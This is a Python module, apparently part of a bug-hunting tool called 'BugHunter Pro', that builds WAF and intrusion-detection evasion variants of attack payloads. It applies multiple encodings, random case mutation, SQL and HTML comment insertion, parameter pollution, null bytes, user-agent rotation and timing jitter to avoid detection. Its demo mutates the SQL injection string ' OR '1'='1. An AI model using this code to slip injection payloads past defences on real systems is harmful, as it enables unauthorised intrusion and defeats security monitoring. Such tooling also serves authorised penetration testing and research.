#!/usr/bin/env python3
"""
Advanced Evasion Engine for BugHunter Pro
Multiple encoding methods, case mutation, and WAF bypass techniques
"""

import random
import base64
import urllib.parse
from typing import List, Dict, Optional
import logging

logger = logging.getLogger(__name__)


class AdvancedEvasion:
    """Advanced WAF/IPS evasion techniques"""
    
    def __init__(self):
        """Initialize evasion engine"""
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
        ]
    
    def encode_url(self, payload: str) -> str:
        """URL encode payload"""
        return urllib.parse.quote(payload)
    
    def encode_double_url(self, payload: str) -> str:
        """Double URL encode"""
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    def encode_unicode(self, payload: str) -> str:
        """Unicode encode payload"""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    def encode_hex(self, payload: str) -> str:
        """Hex encode payload"""
        return ''.join(f'%{ord(c):02x}' for c in payload)
    
    def encode_base64(self, payload: str) -> str:
        """Base64 encode payload"""
        return base64.b64encode(payload.encode()).decode()
    
    def mutate_case(self, payload: str) -> str:
        """Random case mutation"""
        return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in payload)
    
    def insert_comments(self, payload: str, vuln_type: str = 'sql') -> str:
        """Insert SQL/HTML comments"""
        if vuln_type == 'sql':
            return payload.replace(' ', '/**/').replace('=', '/**/=/**/')
        elif vuln_type == 'xss':
            return payload.replace('<', '<!----><').replace('>', '><!---->')
        return payload
    
    def parameter_pollution(self, param: str, value: str) -> List[tuple]:
        """HTTP parameter pollution"""
        return [
            (param, value),
            (param, 'decoy'),
            (param, value),
        ]
    
    def null_byte_injection(self, payload: str) -> str:
        """Add null bytes"""
        return payload + '%00'
    
    def generate_variants(self, payload: str, vuln_type: str = 'sql') -> List[Dict[str, str]]:
        """Generate multiple evasion variants"""
        variants = []
        
        # Original
        variants.append({'payload': payload, 'encoding': 'none'})
        
        # URL encoded
        variants.append({'payload': self.encode_url(payload), 'encoding': 'url'})
        
        # Double URL encoded
        variants.append({'payload': self.encode_double_url(payload), 'encoding': 'double_url'})
        
        # Case mutation
        variants.append({'payload': self.mutate_case(payload), 'encoding': 'case_mutation'})
        
        # Comments
        variants.append({'payload': self.insert_comments(payload, vuln_type), 'encoding': 'comment_injection'})
        
        # Hex encoded
        variants.append({'payload': self.encode_hex(payload), 'encoding': 'hex'})
        
        # Base64
        variants.append({'payload': self.encode_base64(payload), 'encoding': 'base64'})
        
        # Null byte
        variants.append({'payload': self.null_byte_injection(payload), 'encoding': 'null_byte'})
        
        return variants
    
    def rotate_user_agent(self) -> str:
        """Get random user agent"""
        return random.choice(self.user_agents)
    
    def add_timing_jitter(self, base_delay: float = 0.1) -> float:
        """Add random timing to avoid pattern detection"""
        return base_delay + random.uniform(0, 0.5)


if __name__ == "__main__":
    evasion = AdvancedEvasion()
    
    payload = "' OR '1'='1"
    print(f"Original: {payload}\n")
    
    variants = evasion.generate_variants(payload, 'sql')
    for v in variants:
        print(f"{v['encoding']:20} : {v['payload'][:80]}")
